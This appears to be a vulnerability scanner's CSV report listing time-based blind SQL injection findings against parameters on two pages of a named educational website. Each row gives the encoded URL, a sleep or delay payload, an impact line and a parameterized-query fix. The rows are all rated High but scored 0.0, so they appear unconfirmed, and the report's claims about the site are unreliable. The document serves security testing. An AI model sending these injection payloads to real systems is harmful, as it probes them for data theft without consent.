Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=1%22+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=1%27+AND+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=1%27+AND+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=1+OR+SLEEP%285%29#1573730083756-315babee-cf3c),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=1+OR+SLEEP%285%29#1573730083756-315babee-cf3c),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=1%27+AND+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=1%22+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=1+OR+SLEEP%285%29#1573730083756-315babee-cf3c),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573730083756-315babee-cf3c),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=1%27+AND+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=1%27+AND+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=1%27+AND+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=1%22+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=1%22+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=1%22+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=1%27+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=1%22+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=1%27+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=1%27+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=1%27+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=1%27+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=1%22+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=1%27+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=1%27+AND+SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573730083756-315babee-cf3c),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=SLEEP%285%29%23#1573730083756-315babee-cf3c),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/IQAC/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573730083756-315babee-cf3c),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=SLEEP%285%29%23#1573730083756-315babee-cf3c),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=SLEEP%285%29%23#1573730083756-315babee-cf3c),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573730083756-315babee-cf3c),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=SLEEP%285%29%23#1573730083756-315babee-cf3c),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=SLEEP%285%29%23#1573730083756-315babee-cf3c),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=1+OR+SLEEP%285%29#1573730083756-315babee-cf3c),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/IQAC/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573730083756-315babee-cf3c),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/IQAC/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573730083756-315babee-cf3c),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573730083756-315babee-cf3c),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/IQAC/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573730083756-315babee-cf3c),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=1+OR+SLEEP%285%29#1573730083756-315babee-cf3c),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=SLEEP%285%29%23#1573730083756-315babee-cf3c),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=SLEEP%285%29%23#1573730083756-315babee-cf3c),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/IQAC/?id=1%27+AND+PG_SLEEP%285%29--#1573730083756-315babee-cf3c),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/IQAC/?search=1+OR+SLEEP%285%29#1573730083756-315babee-cf3c),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/IQAC/?q=1+OR+SLEEP%285%29#1573730083756-315babee-cf3c),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
